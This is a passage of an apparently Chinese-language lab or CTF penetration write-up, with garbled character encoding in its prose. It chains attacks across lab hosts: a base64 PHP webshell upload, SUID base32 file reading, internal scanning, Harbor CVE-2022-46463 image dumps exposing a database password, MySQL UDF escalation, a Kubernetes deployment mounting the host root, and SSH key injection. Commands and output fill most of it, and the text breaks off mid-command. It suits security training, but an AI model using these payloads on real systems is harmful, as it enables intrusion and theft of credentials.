(preg_match(<span class="string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, $img, $result)) &#123;</span><br><span class="line">    $<span class="built_in">type</span> = <span class="string">&quot;.&quot;</span>.$result[<span class="number">2</span>];</span><br><span class="line">    $path = <span class="string">&quot;upload/&quot;</span> . date(<span class="string">&quot;Y-m-d&quot;</span>) . <span class="string">&quot;-&quot;</span> . uniqid() . $<span class="built_in">type</span>;</span><br><span class="line">&#125;</span><br><span class="line">$img =  base64_decode(str_replace($result[<span class="number">1</span>], <span class="string">&#x27;&#x27;</span>, $img));</span><br><span class="line"><span class="meta">@file_put_contents(<span class="params">$path, $img</span>);</span></span><br><span class="line">exit(<span class="string">&#x27;&#123;&quot;src&quot;:&quot;&#x27;</span>.$path.<span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imgbase64=data:image/php;base64,PD89ZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>/upload/<span class="number">2024</span>-06-03-665db63834ca2.php</span><br><span class="line"></span><br><span class="line">å¯†ç <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="assets/image-20240603203627-ogh9siq.png" alt="image">â€‹</p><p>ä¿®æ”¹ç”Ÿæˆçš„æ–‡ä»¶ä¸­çš„æ–‡ä»¶åï¼Œæ”¹ä¸ºæˆ‘ä»¬çš„ä¸€å¥è¯é©¬å­ï¼Œè¿™é‡Œposté©¬å­æœ‰ç‚¹é—®é¢˜éœ€è¦æ¢æˆgetçš„é©¬å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>/upload/.antproxy.php?<span class="number">1</span>=system(<span class="string">&quot;whoami&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/<span class="built_in">bin</span>/fusermount</span><br><span class="line">/<span class="built_in">bin</span>/ping6</span><br><span class="line">/<span class="built_in">bin</span>/mount</span><br><span class="line">/<span class="built_in">bin</span>/su</span><br><span class="line">/<span class="built_in">bin</span>/ping</span><br><span class="line">/<span class="built_in">bin</span>/umount</span><br><span class="line">/usr/<span class="built_in">bin</span>/chfn</span><br><span class="line">/usr/<span class="built_in">bin</span>/newgrp</span><br><span class="line">/usr/<span class="built_in">bin</span>/gpasswd</span><br><span class="line">/usr/<span class="built_in">bin</span>/at</span><br><span class="line">/usr/<span class="built_in">bin</span>/staprun</span><br><span class="line">/usr/<span class="built_in">bin</span>/base32</span><br><span class="line">/usr/<span class="built_in">bin</span>/passwd</span><br><span class="line">/usr/<span class="built_in">bin</span>/chsh</span><br><span class="line">/usr/<span class="built_in">bin</span>/sudo</span><br><span class="line">/usr/lib/dbus-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/s-nail/s-nail-privsep</span><br></pre></td></tr></table></figure><p>base32å…·æœ‰suidæƒé™ï¼Œç›´æ¥è¯»å–flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MZWGCZZQGI5CAZTMMFTXWNJWMQZTONZTGQWTKZRXGMWTINBXMYWWEMLBGUWWCOBTMY2DKNJUHFRDEOD5BI======</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag02: flag&#123;56d37734-5f73-447f-b1a5-a83f45549b28&#125;</span><br></pre></td></tr></table></figure><p>ifconfig</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr <span class="number">00</span>:<span class="number">16</span>:3e:04:<span class="number">99</span>:<span class="number">35</span>  </span><br><span class="line">          inet addr:<span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>  Bcast:<span class="number">172.28</span><span class="number">.255</span><span class="number">.255</span>  Mask:<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">          inet6 addr: fe80::<span class="number">216</span>:3eff:fe04:<span class="number">9935</span>/<span class="number">64</span> Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">52494</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">16279</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span> </span><br><span class="line">          RX <span class="built_in">bytes</span>:<span class="number">57355451</span> (<span class="number">57.3</span> MB)  TX <span class="built_in">bytes</span>:<span class="number">14468994</span> (<span class="number">14.4</span> MB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr <span class="number">00</span>:<span class="number">16</span>:3e:04:<span class="number">67</span>:<span class="number">36</span>  </span><br><span class="line">          inet addr:<span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>  Bcast:<span class="number">172.22</span><span class="number">.255</span><span class="number">.255</span>  Mask:<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">          inet6 addr: fe80::<span class="number">216</span>:3eff:fe04:<span class="number">6736</span>/<span class="number">64</span> Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">900</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">902</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span> </span><br><span class="line">          RX <span class="built_in">bytes</span>:<span class="number">38896</span> (<span class="number">38.8</span> KB)  TX <span class="built_in">bytes</span>:<span class="number">38816</span> (<span class="number">38.8</span> KB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  Mask:<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">          inet6 addr: ::<span class="number">1</span>/<span class="number">128</span> Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:<span class="number">65536</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">379</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">379</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1</span> </span><br><span class="line">          RX <span class="built_in">bytes</span>:<span class="number">138851</span> (<span class="number">138.8</span> KB)  TX <span class="built_in">bytes</span>:<span class="number">138851</span> (<span class="number">138.8</span> KB)</span><br></pre></td></tr></table></figure><p>cd /tmp;./fs -h 172.22.14.1/24 -o result.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target <span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>     <span class="keyword">is</span> alive</span><br><span class="line">(icmp) Target <span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>    <span class="keyword">is</span> alive</span><br><span class="line">(icmp) Target <span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>    <span class="keyword">is</span> alive</span><br><span class="line">[*] Icmp alive hosts <span class="built_in">len</span> <span class="keyword">is</span>: <span class="number">3</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>:<span class="number">21</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>:<span class="number">80</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>:<span class="number">80</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">10250</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">2379</span> <span class="built_in">open</span></span><br><span class="line">[*] alive ports <span class="built_in">len</span> <span class="keyword">is</span>: <span class="number">8</span></span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>        code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">13693</span>  title:æ–°ç¿”OAç®¡ç†ç³»ç»Ÿ-OAç®¡ç†å¹³å°è”ç³»ç”µè¯ï¼š<span class="number">13849422648</span>å¾®ä¿¡åŒå·ï¼ŒQQ958756413</span><br><span class="line">[*] WebTitle: http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>       code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">785</span>    title:Harbor</span><br><span class="line">[+] InfoScan:http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>       [Harbor] </span><br><span class="line">[*] WebTitle: https://<span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">10250</span> code:<span class="number">404</span> <span class="built_in">len</span>:<span class="number">19</span>     title:<span class="literal">None</span></span><br><span class="line">[+] ftp://<span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>:<span class="number">21</span>:anonymous </span><br><span class="line">   [-&gt;]OASystem.<span class="built_in">zip</span></span><br><span class="line">[+] http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>/swagger.json poc-yaml-swagger-ui-unauth [&#123;path swagger.json&#125;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ä»£ç† 172.28.23.26:10001</p><h1>Harbor1</h1><p>CVE-2022-46463æœªæˆæƒè®¿é—®ï¼Œè¿›è¡Œé•œåƒæ‰«æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">[+] search -&gt; <span class="number">0</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">1</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">2</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">3</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">4</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">5</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">6</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">7</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">8</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">9</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; a</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; b</span><br><span class="line">[&#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; c</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; d</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; e</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; f</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; g</span><br><span class="line">[&#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; h</span><br><span class="line">[&#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; i</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; j</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; k</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; l</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; m</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; n</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; o</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; p</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; q</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; r</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; s</span><br><span class="line">[&#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; t</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; u</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; v</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; w</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; x</span><br><span class="line">[&#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; y</span><br><span class="line">[&#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; z</span><br><span class="line">[]</span><br><span class="line">Vulnerability URL, please verify</span><br><span class="line">http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>//harbor/projects/<span class="number">4</span>/repositories/projectadmin?publicAndNotLogged=yes</span><br><span class="line">http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>//harbor/projects/<span class="number">3</span>/repositories/secret?publicAndNotLogged=yes</span><br><span class="line">http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>//harbor/projects/<span class="number">1</span>/repositories/nginx?publicAndNotLogged=yes</span><br><span class="line">http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>//harbor/projects/<span class="number">4</span>/repositories/portal?publicAndNotLogged=yes</span><br><span class="line">http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>//harbor/projects/<span class="number">1</span>/repositories/redis?publicAndNotLogged=yes</span><br></pre></td></tr></table></figure><p>ä¸‹è½½secreté•œåƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python harbor.py http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>/ --dump harbor/secret --v2</span><br></pre></td></tr></table></figure><p><img src="assets/image-20240603213151-7ywln24.png" alt="image">â€‹</p><p>flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}</p><h1>Harbor2</h1><p>ç»§ç»­ä¸‹è½½é•œåƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python harbor.py http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>/ --dump project/projectadmin --v2</span><br></pre></td></tr></table></figure><p><img src="assets/image-20240603221215-ox4ns40.png" alt="image">â€‹</p><p>åœ¨å¦ä¸€ä¸ªæ–‡ä»¶å¤¹çš„run.shä¸­å‘ç°è¿è¡Œäº†è¯¥ç¨‹åºï¼Œåç¼–è¯‘ä¹‹åå‘ç°æ•°æ®åº“çš„è´¦å·å¯†ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.url=jdbc:mysql://<span class="number">172.22</span><span class="number">.10</span><span class="number">.28</span>:<span class="number">3306</span>/projectadmin?characterEncoding=utf-<span class="number">8</span>&amp;useUnicode=true&amp;serverTimezone=UTC</span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=My3q1i4oZkJm3</span><br><span class="line">spring.datasource.driver-<span class="keyword">class</span>-name=com.mysql.cj.jdbc.Driver</span><br><span class="line"></span><br><span class="line">mybatis.<span class="built_in">type</span>-aliases-package=com.smartlink.projectadmin.entity</span><br><span class="line">mybatis.mapper-locations=classpath:mybatis/mapper/*.xml</span><br></pre></td></tr></table></figure><p>å°è¯•è¿æ¥ï¼Œè¿™é‡Œæ˜¯ç›´æ¥ç”¨åˆ°äº†è¿™é‡Œçš„urlå’Œç«¯å£ï¼Œæ•°æ®åº“æ»ç©ºï¼Œè´¦å·&amp;å¯†ç </p><p><img src="assets/image-20240603221621-guvbj3s.png" alt="image">â€‹</p><p>ç›´æ¥udfææƒ</p><p><img src="assets/image-20240603221627-z86vc34.png" alt="image">â€‹</p><p>flag06: flag{413ac6ad-1d50-47cb-9cf3-17354b751741}</p><h1>K8sæœªæˆæƒè®¿é—®</h1><p>è®¿é—®6443ç«¯å£ï¼Œå‘ç°å­˜åœ¨æœªæˆæƒ</p><p>ç¼–å†™ä¸€ä¸ªè„šæœ¬å¯åŠ¨å®¹å™¨</p><p>evil-deployment.yaml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-deployment</span><br><span class="line">  labels:</span><br><span class="line">    app: nginx</span><br><span class="line">spec:</span><br><span class="line">  replicas: <span class="number">1</span></span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: nginx</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: nginx</span><br><span class="line">        image: nginx:<span class="number">1.8</span></span><br><span class="line">        volumeMounts:</span><br><span class="line">        - mountPath: /mnt</span><br><span class="line">          name: test-volume</span><br><span class="line">      volumes:</span><br><span class="line">      - name: test-volume</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /</span><br></pre></td></tr></table></figure><p>ç”±äºproxychainæ— æ³•ä»£ç†kubectlå®¢æˆ·ç«¯çš„æµé‡ï¼Œæ‰€ä»¥ä½¿ç”¨winå¼€å…¨å±€å–æ‰“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe --insecure-skip-tls-verify -s https://<span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">6443</span>/  apply -f evil-deployment.yaml</span><br></pre></td></tr></table></figure><p>åˆ—å‡ºpodï¼ˆæ„Ÿè§‰åƒæ˜¯å¯åŠ¨çš„å®¹å™¨åˆ—è¡¨ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe --insecure-skip-tls-verify -s https://<span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">6443</span>/ get pods</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨idç™»å½•å®¹å™¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe --insecure-skip-tls-verify -s https://<span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">6443</span>/ <span class="built_in">exec</span> -it nginx-deployment-864f8bfd6f-fktn5 /<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¸Šé¢çš„å¯åŠ¨è„šæœ¬å·²ç»å°†å®¿ä¸»æœºçš„ç£ç›˜æŒ‚è½½åˆ°mntç›®å½•ä¸‹äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥åœ¨mntç›®å½•ä¸‹å¯¹å®¿ä¸»æœºçš„ç£ç›˜è¿›è¡Œæ“ä½œ</p><p>åˆ©ç”¨linuxæœºå™¨ç”Ÿæˆsshè¿æ¥å¯†é’¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b <span class="number">4096</span> </span><br></pre></td></tr></table></figure><p>é»˜è®¤è·¯å¾„/root/.ssh/id_rsaï¼Œå°†ç”Ÿæˆçš„id_rsa.pubå†™å…¥é¶æœºå¯¹åº”æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;ssh-rsa 